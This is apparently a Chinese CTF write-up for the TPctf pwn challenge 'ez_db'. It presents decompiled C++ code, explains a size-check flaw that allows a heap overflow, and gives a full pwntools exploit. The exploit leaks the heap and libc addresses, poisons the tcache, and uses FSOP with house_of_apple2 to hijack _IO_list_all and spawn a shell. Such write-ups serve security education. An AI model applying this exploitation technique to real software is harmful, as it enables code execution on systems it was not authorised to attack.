# TPctf-PWN-ez_db-先知社区

> **来源**: https://xz.aliyun.com/news/17238  
> **文章ID**: 17238

---

# TPctf-ez\_db （堆溢出+fsop+apple2）

TPctf难度有的，不过只出了这一道pwn题

* 题目：《ez\_db》
* 考点：堆溢出
* 攻击手法：fsop＋house\_of\_apple2

### 题目主函数

下面是我修过后的主函数，大致是一个mesage管理系统。

一个0x400大的chunk为一个主chunk，添加记录信息由后向前分割大chunk，chunk头部是id和分割大小的信息。我会上传文件信息和我修过的ida文件。

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  TablePage *chunk_addr; // rbx
  void *Page; // rax
  __int64 v5; // rdx
  chunk *v6; // rax
  __int16 *v7; // rax
  size_t v8; // rbx
  __int64 v9; // rax
  chunk *v10; // rax
  unsigned __int16 ID; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int16 inserted; // [rsp+2h] [rbp-4Eh]
  int opt; // [rsp+4h] [rbp-4Ch] BYREF
  unsigned int idx; // [rsp+8h] [rbp-48h] BYREF
  int i; // [rsp+Ch] [rbp-44h]
  chunk *v17; // [rsp+10h] [rbp-40h]
  chunk *mid; // [rsp+18h] [rbp-38h]
  _DWORD index[6]; // [rsp+20h] [rbp-30h] BYREF
  unsigned __int64 v20; // [rsp+38h] [rbp-18h]

  v20 = __readfsqword(0x28u);
  init();
  for ( i = 0; i <= 15; ++i )
    chunk_grupe[i] = 0LL;
  while ( 1 )
  {
    print_operations();
    __isoc99_scanf("%d", &opt);
    switch ( opt )
    {
      case 1:                                   // creat
        printf("Index: ");
        __isoc99_scanf("%d", index);
        if ( index[0] >= 0x10u )
          goto err;
        if ( chunk_grupe[index[0]] )
        {
          puts("Table Page already exists");
        }
        else
        {
          chunk_addr = operator new(0x20uLL);
          TablePage::TablePage(chunk_addr);
          chunk_grupe[index[0]] = chunk_addr;
          puts("Table Page created");
        }
        continue;
      case 2:                                   // remove
        printf("Table Page Index: ");
        __isoc99_scanf("%d", index);
        if ( index[0] >= 0x10u )
          goto err;
        if ( !chunk_grupe[index[0]] )
          goto LABEL_34;
        Page = TablePage::GetPage(chunk_grupe[index[0]]);
        free(Page);
        v5 = index[0];
        if ( chunk_grupe[v5] )
          operator delete(chunk_grupe[v5], 0x20uLL);
        chunk_grupe[index[0]] = 0LL;
        puts("Table Page removed");
        break;
      case 3:
        printf("Index: ");                      // write_message
        __isoc99_scanf("%d", index);
        if ( index[0] >= 0x10u )
          goto err;
        if ( !chunk_grupe[index[0]] )
          goto LABEL_34;
        v6 = operator new(0x10uLL);
        v6->size = 0;
        v6->addr = 0LL;
        mid = v6;
        printf("Varchar Length: ");
        __isoc99_scanf("%hd", mid);
        if ( mid->size )
        {
          mid->addr = operator new[](mid->size);
          printf("Varchar: ");
          read(0, mid->addr, mid->size);
          inserted = TablePage::InsertRecord(chunk_grupe[index[0]], mid);
          if ( mid->addr )
            operator delete[](mid->addr);
          if ( mid )
            operator delete(mid, 0x10uLL);
          printf("Record inserted, slot id: %d
", inserted);
        }
        else
        {
          puts("Invalid varchar length");
          if ( mid )
            operator delete(mid, 0x10uLL);
        }
        break;
      case 4:                                   // get
        printf("Index: ");
        __isoc99_scanf("%d", &idx);
        if ( idx >= 0x10 )
          goto err;
        if ( !chunk_grupe[idx] )
          goto LABEL_34;
        printf("Slot ID: ");
        __isoc99_scanf("%hd", &ID);
        TablePage::GetRecord(index, chunk_grupe[idx], ID);
        if ( std::operator!=<Record>(index) )
        {
          v7 = std::__shared_ptr_access<Record,(__gnu_cxx::_Lock_policy)2,false,false>::operator->(index);
          printf("Varchar Length: %d
", *v7);
          printf("Varchar: ");
          v8 = *std::__shared_ptr_access<Record,(__gnu_cxx::_Lock_policy)2,false,false>::operator->(index);
          v9 = std::__shared_ptr_access<Record,(__gnu_cxx::_Lock_policy)2,false,false>::operator->(index);
          write(1, *(v9 + 8), v8);
          putchar(10);
        }
        else
        {
          puts("Record not found");
        }
        std::shared_ptr<Record>::~shared_ptr(index);
        break;
      case 5:                                   // edit
        printf("Index: ");
        __isoc99_scanf("%d", index);
        printf("Slot ID: ");
        __isoc99_scanf("%hd", &idx);
        if ( index[0] < 0x10u )
        {
          if ( chunk_grupe[index[0]] )
          {
            v10 = operator new(0x10uLL);
            v10->size = 0;
            v10->addr = 0LL;
            v17 = v10;
            printf("Varchar Length: ");
            __isoc99_scanf("%hd", v17);
            v17->addr = operator new[](v17->size);
            printf("Varchar: ");
            read(0, v17->addr, v17->size);
            if ( TablePage::EditRecord(chunk_grupe[index[0]], idx, v17) )
              puts("Record edited");
            else
              puts("Record Illegal edit");
          }
          else
          {
LABEL_34:
            puts("Table Page does not exist");
          }
        }
        else
        {
err:
          puts("Invalid index");
        }
        break;
      default:
        return 0;
    }
  }
}
```

### 漏洞点：

在insert检测size的时候，会比较(this->end - this->pos + 1)与size＋4，end减去pos最大是0x400，导致此处比骄后，size最大可以是0x400-3

```
 if ( TablePage::GetFreeSpaceSize(this) < (Size + 4LL) )
 //   return this->end - this->pos + 1;
    return -1;
```

配合下面的memcpy函数然后此处的end-size后最多chunk只剩3个字节，而我们的size信息是储存到第四个字节处的，也就是我们设置size是0x400-3时可以覆盖到chunk储存的size信息。我们将其改大就会造成堆溢出。

```
memcpy(this->end - Size, mid->addr, Size);
```

### 思路：

从后往前free chunk，修改size就直接 输出被free的chunk信息拿到libc和heap基地址。然后堆溢出修改tecach bin的fd。然后劫持到io\_list\_all，打apple2。

### EXP:

```
#!/usr/bin/python3
# -*- encoding: utf-8 -*-

from pwn import *

#context(os = 'linux', arch = 'amd64', log_level = 'debug')
context(os = 'linux', arch = 'amd64', log_level = 'debug')
#context.terminal = ['tmux', 'splitw', '-h']
menu = 0x000000000001503
edit = 0x0000000000001B6E
add = 0x000000000001D05

file_name = './db'
b_string ="b main
"
b_slice = [menu,"_IO_flush_all_lockp"]
pie = 1
for i in b_slice:
    if type(i) == int and pie:
        b_string += f"b *$rebase({i})
"
    elif type(i) == int :
        b_string += f"b *{hex(i)}
"
    else :
        if type(i) == str:
            b_string += f"b *"+i+f"
"
#1 => attach
#2 => debug
#3 => remote

choice = 1
if choice == 1 :
    p = process(file_name)
    # gdb.attach(p,b_string)
    print(f"Break_point:
"+b_string)
    
elif choice == 2 :
    p = gdb.debug(file_name,b_string)
    print(f"Break_point:
"+b_string)
    
elif choice == 3 :
    ip_add ="nc1.ctfplus.cn"
    port = 39169
    print("[==^==] remote : "+ip_add+str(port))
    p = remote(ip_add,port)

#-----------------------------------------------------------------------------------------
def Qword(data): 
    if type(data) == bytes :
        print("[~]===> Data : ")
        for i in range(len(data)//8):
            print("         %.2x : 0x%x" % (8*i,u64(data[i*8:(i*8+8)])))
    else :
        print("Print data failed!!")
rv = lambda x            : p.recv(x)
rl = lambda a=False      : p.recvline(a)
ru = lambda a,b=True     : p.recvuntil(a,b)
rn = lambda x            : p.recvn(x)
sd = lambda x            : p.send(x)
sl = lambda x            : p.sendline(x)
sa = lambda a,b          : p.sendafter(a,b)
sla = lambda a,b         : p.sendlineafter(a,b)
#u32 = lambda             : u32(p.recv(4).ljust(4,b'\x00'))
#u64 = lambda             : u64(p.recv(6).ljust(8,b'\x00'))
inter = lambda           : p.interactive()
debug = lambda text=None : gdb.attach(p, text)
lg = lambda s,addr       : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s,addr))
pad = lambda a,b           : print("\x1B[1;36m[+]{} =====> 0x%x \x1B[0m".format(a)%b)
#-----------------------------------------------------------------------------------------

def menu(cho):
    sla(">>> ",str(cho))
def add(index):
    menu(1)
    sla("Index: ",str(index))
    print("==== add ====")
def sub(index):
    menu(2)
    sla("Table Page Index: ",str(index))
    print("==== sub ====")
def insert(index,size,payload):
    menu(3)
    sla("Index: ",str(index))
    sla("Varchar Length: ",str(size))
    sa("Varchar: ",payload.ljust(size-2,b"\x00")+b'mm')
    ru("Record inserted, slot id: ")
    # ret = int(rl())
    # print(f"==== insert ==== ret {ret}")
    # return ret
def get(index,id):
    menu(4)
    sla("Index: ",str(index))
    sla("Slot ID: ",str(id))
    ru("mm")
    rv(16)
    print("==== get ====")
    
def edit(index,id,size,payload):
    menu(5)
    sla("Index: ",str(index))
    sla("Slot ID: ",str(id))
    sla("Varchar Length: ",str(size))
    sa("Varchar: ",payload)
    print("==== edit ====")
    
for i in range(9):
    add(i)
for i in range(8):
    sub(8-i)
insert(0,0x400-3,b'\x0f')

get(0,0)
heap = (u64(rv(8))<<12)-0x12000
pad("heap",heap)
res = rv(0x68)
libc = u64(rv(8))-0x21ace0
pad("libc",libc)

flag = b"fake_FILE_struct"
addr = heap + 0x012538
heap_a = addr + 0x100
heap_b = heap_a + 0x0
vtable = libc + 0x2170c0 #_IO_wfile_jumps
system = libc + 0x050d70 #system

wide_vtable = b'\x00'*0x68 + p64(system)
wide_data = wide_vtable.ljust(0xe0,b'\x00')+p64(heap_b)

FILE = b"  sh"+b"\x00"*4
FILE = FILE.ljust(0x28,b'\x00')+p64(1)
FILE = FILE.ljust(0xa0,b'\x00')+p64(heap_a) #_wide_data
FILE = FILE.ljust(0xd8,b'\x00')+p64(vtable) #vatable
FILE = FILE.ljust(heap_a-addr,b'\x00') + wide_data
FILE = flag + FILE

fake_fd = libc+0x21b680 #IO_list_all
payload = b'\x0f'+b'\x00'*(0x400-4)
payload += p64(0)+p64(0x31)+p64(libc + 0x21ad00)*2+p64(heap+0x012720)+p64(heap+0x012320)#+p64(0)+p64(0x31)+p64(0)*4
payload += p64(0x30)+p64(0x20)+p64(heap+0x12320>>12)+p64(0)
payload += p64(0)+p64(0x21)+p64(0)*2
payload += p64(0)+p64(0x3d1)+p64(libc+0x21b0a0)*2+b'\x00'*(0x3d0-0x20-len(FILE))+FILE
payload += p64(0x3d0)+p64(0x30)+p64((heap+0x012730>>12)^(heap+0x012b70))+p64(0)*3
payload += p64(0)+p64(0x411)+p64((heap + 0x012760 >> 12) ^ (fake_fd-0x3f0))

edit(0,0,0xf00,payload)
add(1)
add(2)#劫持到list_all
gdb.attach(p,b_string)
insert(2,0x10,p64(addr))#覆盖list_all
insert(2,0x10,p64(addr))#不要这个会一直循环进入case 3
sla(">>> ",str(6)) #调用exit打fsop＋
inter()

```
